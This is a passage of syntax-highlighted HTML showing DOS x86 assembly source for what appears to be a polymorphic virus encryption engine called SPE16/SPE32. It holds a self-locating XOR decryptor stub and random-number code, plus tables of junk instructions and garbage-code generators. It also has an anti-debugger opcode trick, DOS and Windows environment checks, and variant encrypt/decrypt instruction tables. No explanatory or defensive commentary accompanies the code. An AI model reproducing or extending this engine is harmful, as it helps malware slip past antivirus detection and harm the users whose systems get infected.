</span><span class="sc5">GET_RAND_8</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1234H</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">GET_RAND_4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1234H</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">GET_RAND_3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1234H</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">OFF_GET_RAND_2</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
</span><span class="sc5">GET_RAND_2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">GET_RAND_BYTE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
        
</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;ENTRY: AX=(LIMIT-1) OR EAX=0 IF INFINITY</span><span class="sc0">
</span><span class="sc1">;EXIT: AX=RANDOM VALUE, ZF=1 IF ZERO</span><span class="sc0">
</span><span class="sc5">GET_RAND</span><span class="sc0">    </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">RANDOMIZE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc2">3A7FDH</span><span class="sc0">
        </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">269EC3H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">RANDOMIZE</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_LIMITED</span><span class="sc0">
        </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc5">NO_LIMITED</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">DECRYPTOR</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
</span><span class="sc5">RELO_DECRYPT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1234H</span><span class="sc0">
</span><span class="sc5">FIRST_MASK</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">OUR_LEN</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DOS_OFF_CALC</span><span class="sc0">
</span><span class="sc5">DOS_OFF_CALC</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
</span><span class="sc5">DECRYPT_BYTE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc5">DECRYPT_DELTA</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1234H</span><span class="sc0">
</span><span class="sc5">SECOND_MASK</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">DECRYPT_BYTE</span><span class="sc0">
</span><span class="sc5">DECRYPT_DELTA</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">DOS_OFF_CALC</span><span class="sc0">
</span><span class="sc5">LEN_DECRYPTOR</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">RELO_DECRYPT</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;DATA FOR SPE16</span><span class="sc0">
</span><span class="sc1">;IF (LOBYTE)=0FFH THEN IT'S RANDOM</span><span class="sc0">
</span><span class="sc5">INT21_AX</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">LEN21_AX</span><span class="sc0">
</span><span class="sc5">INT21_TBL</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0BFFH</span><span class="sc4">,</span><span class="sc2">18FFH</span><span class="sc4">,</span><span class="sc2">19FFH</span><span class="sc4">,</span><span class="sc2">20FFH</span><span class="sc4">,</span><span class="sc2">3303H</span><span class="sc4">,</span><span class="sc2">3304H</span><span class="sc4">,</span><span class="sc2">54FFH</span><span class="sc4">,</span><span class="sc2">5800H</span><span class="sc4">,</span><span class="sc2">5802H</span><span class="sc0">
</span><span class="sc5">LEN21_AX</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">INT21_TBL</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">INT2F_AX</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">LEN2F_AX</span><span class="sc0">
</span><span class="sc5">INT2F_TBL</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">1600H</span><span class="sc4">,</span><span class="sc2">1686H</span><span class="sc4">,</span><span class="sc2">4300H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc2">500H</span><span class="sc4">,</span><span class="sc2">600H</span><span class="sc4">,</span><span class="sc2">1000H</span><span class="sc4">,</span><span class="sc2">1100H</span><span class="sc4">,</span><span class="sc2">1400H</span><span class="sc4">,</span><span class="sc2">1A00H</span><span class="sc4">,</span><span class="sc2">1B00H</span><span class="sc4">,</span><span class="sc2">4000H</span><span class="sc0">
</span><span class="sc5">LEN2F_AX</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">INT2F_TBL</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">SIMPLE_OP</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
</span><span class="sc5">SIMPLE_TBL</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CLC</span><span class="sc0">                 </span><span class="sc1">;&lt;-</span><span class="sc0">
        </span><span class="sc6">STC</span><span class="sc0">
        </span><span class="sc6">CMC</span><span class="sc0">
        </span><span class="sc6">SAHF</span><span class="sc0">
        </span><span class="sc6">NOP</span><span class="sc0">
        </span><span class="sc6">REPE</span><span class="sc0">
        </span><span class="sc6">REPNE</span><span class="sc0">
        </span><span class="sc5">SEGES</span><span class="sc0">
        </span><span class="sc5">SEGSS</span><span class="sc0">
        </span><span class="sc5">SEGDS</span><span class="sc0">                   </span><span class="sc1">;&lt;- USE IN SPE32</span><span class="sc0">
</span><span class="sc5">LEN_SIMPLE32</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">SIMPLE_TBL</span><span class="sc0">

        </span><span class="sc6">STI</span><span class="sc0">
        </span><span class="sc6">CLI</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">
        </span><span class="sc6">STD</span><span class="sc0">
        </span><span class="sc6">INTO</span><span class="sc0">
        </span><span class="sc5">SEGCS</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0CDH</span><span class="sc0">                </span><span class="sc1">;ANTI-TD (INT 34H-3FH)</span><span class="sc0">
</span><span class="sc5">LEN_SIMPLE_OP</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">SIMPLE_TBL</span><span class="sc0">

</span><span class="sc5">AX_OP</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
</span><span class="sc5">AX_TBL</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">DAA</span><span class="sc0">
        </span><span class="sc6">DAS</span><span class="sc0">
        </span><span class="sc6">AAA</span><span class="sc0">
        </span><span class="sc6">AAS</span><span class="sc0">
        </span><span class="sc6">CBW</span><span class="sc0">
        </span><span class="sc6">LAHF</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0D6H</span><span class="sc0">                </span><span class="sc1">;SETALC</span><span class="sc0">
        </span><span class="sc6">XLAT</span><span class="sc0">
</span><span class="sc5">LEN_AX_OP</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">AX_TBL</span><span class="sc0">

</span><span class="sc5">PROC_SHIT</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
</span><span class="sc5">PSHIT_RELO</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">ONE_SHIT</span><span class="sc4">,</span><span class="sc5">SMASHTOP_SHIT</span><span class="sc4">,</span><span class="sc5">PSPCALL_SHIT</span><span class="sc4">,</span><span class="sc5">MOVREG_SHIT</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">INCDEC_SHIT</span><span class="sc0">
</span><span class="sc5">AXSHIT_RELO</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">XCHG_SHIT</span><span class="sc4">,</span><span class="sc5">AX_SHIT</span><span class="sc4">,</span><span class="sc5">INT_SHIT</span><span class="sc0">  </span><span class="sc1">;ALWAYS LAST</span><span class="sc0">
</span><span class="sc5">SIZE_SHIT</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">PSHIT_RELO</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">SIZE_LAST_SHIT</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">AXSHIT_RELO</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">PROC_EXIT</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
</span><span class="sc5">EXIT_RELO</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">VIA_RETN</span><span class="sc4">,</span><span class="sc5">VIA_JMPCALL</span><span class="sc4">,</span><span class="sc5">VIA_INT20</span><span class="sc4">,</span><span class="sc5">VIA_INT21_0</span><span class="sc4">,</span><span class="sc5">VIA_INT21_4C</span><span class="sc0">
</span><span class="sc5">SIZE_PROC_EXIT</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EXIT_RELO</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">TRICK_TBL</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
</span><span class="sc5">TRICK_RELO</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">TRICK_1</span><span class="sc4">,</span><span class="sc5">TRICK_2</span><span class="sc4">,</span><span class="sc5">TRICK_3</span><span class="sc4">,</span><span class="sc5">TRICK_4</span><span class="sc4">,</span><span class="sc5">TRICK_5</span><span class="sc4">,</span><span class="sc5">TRICK_6</span><span class="sc4">,</span><span class="sc5">TRICK_7</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">TRICK_8</span><span class="sc4">,</span><span class="sc5">TRICK_9</span><span class="sc4">,</span><span class="sc5">TRICK_10</span><span class="sc4">,</span><span class="sc5">TRICK_11</span><span class="sc4">,</span><span class="sc5">TRICK_12</span><span class="sc4">,</span><span class="sc5">TRICK_13</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">TRICK_14</span><span class="sc4">,</span><span class="sc5">TRICK_15</span><span class="sc4">,</span><span class="sc5">TRICK_16</span><span class="sc4">,</span><span class="sc5">TRICK_17</span><span class="sc4">,</span><span class="sc5">TRICK_18</span><span class="sc4">,</span><span class="sc5">TRICK_19</span><span class="sc0">
</span><span class="sc5">SIZE_TRICK_TBL</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">TRICK_RELO</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc1">;ALSO MAY INCLUDED (WITH SOME CODE CHANGING IN GENERATING VALID SREG AND</span><span class="sc0">
</span><span class="sc1">;ASSUMES ON ENTRY CHECK_REG SUBROUTINE):</span><span class="sc0">
</span><span class="sc1">;1. AH=2AH - GET SYSTEM DATE (CHECKING VALID RETURN PARAM)</span><span class="sc0">
</span><span class="sc1">;2. AH=2CH - GET SYSTEM TIME (AS ABOVE)</span><span class="sc0">
</span><span class="sc1">;3. AH=2FH - GET DTA (BX=80H/ES RESTORED)</span><span class="sc0">
</span><span class="sc1">;4. AX=3305H - GET BOOT DRIVE (DL=1...1AH)</span><span class="sc0">
</span><span class="sc1">;5. AX=3306H - GET TRUE DOS VERSION (BL&gt;=7)</span><span class="sc0">
</span><span class="sc1">;6. AX=1611H - WIN9X SPECIFIC (AX=0/DS RESTORED)</span><span class="sc0">
</span><span class="sc1">;7. AX=4A33H - CHECK MS-DOS VER 7 (AS ABOVE)</span><span class="sc0">
</span><span class="sc1">;8. AX=4B21H - WIN.COM IS ACTIVE? (AH=0)</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">ENCRYPT_TBL</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
</span><span class="sc5">ENCRYPT_RELO</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">1234H</span><span class="sc4">],</span><span class="sc2">12H</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">1234H</span><span class="sc4">],</span><span class="sc2">12H</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">1234H</span><span class="sc4">],</span><span class="sc2">12H</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">1234H</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">1234H</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">1234H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">1234H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">1234H</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">1234H</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">1234H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">NEG</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">1234H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">SIZE_ENCRYPT_TBL</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">ENCRYPT_RELO</span><span class="sc0">

</span><span class="sc5">DECRYPT_TBL</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">NEG</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;DATA FOR SPE32</span><span class="sc0">
</span><span class="sc5">INIT_LIST</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">LEN_INIT_LIST</span><span class="sc0">
</span><span class="sc5">INIT_LIST_RELO</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">INIT_OFF</span><span class="sc4">,</span><span class="sc5">INIT_COUNT</span><span class="sc4">,</span><span class="sc5">INIT_MASK</span><span class="sc0">
</span><span class="sc5">LEN_INIT_LIST</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">INIT_LIST_RELO</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">LOOP_LIST</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">LEN_LOOP_LIST</span><span class="sc0">
</span><span class="sc5">LOOP_LIST_RELO</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">CHANGE_MASK_REG</span><span class="sc4">,</span><span class="sc5">MOV_WORK_REG</span><span class="sc4">,</span><span class="sc5">CHANGE_WORK_REG</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">STORE_WORK_REG</span><span class="sc4">,</span><span class="sc5">CHANGE_OFF_REG</span><span class="sc0">
</span><span class="sc5">LEN_LOOP_LIST</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">LOOP_LIST_RELO</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc1">;EBX=WORK_REG FOR CRYPTING</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0CB0FH</span><span class="sc0">              </span><span class="sc1">;BSWAP EBX (ALWAYS TOP)</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0DBF7H</span><span class="sc0">              </span><span class="sc1">;NEG EBX</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0D3F7H</span><span class="sc0">              </span><span class="sc1">;NOT EBX</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0CBD1H</span><span class="sc0">              </span><span class="sc1">;ROR EBX,1</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0C3D1H</span><span class="sc0">              </span><span class="sc1">;ROL EBX,1</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">4390H</span><span class="sc0">               </span><span class="sc1">;INC EBX</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">4B90H</span><span class="sc0">               </span><span class="sc1">;DEC EBX</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0CBC1H</span><span class="sc0">              </span><span class="sc1">;ROR EBX</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0C3C1H</span><span class="sc0">              </span><span class="sc1">;ROL EBX</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0EB81H</span><span class="sc0">              </span><span class="sc1">;SUB EBX</span><span class="sc0">
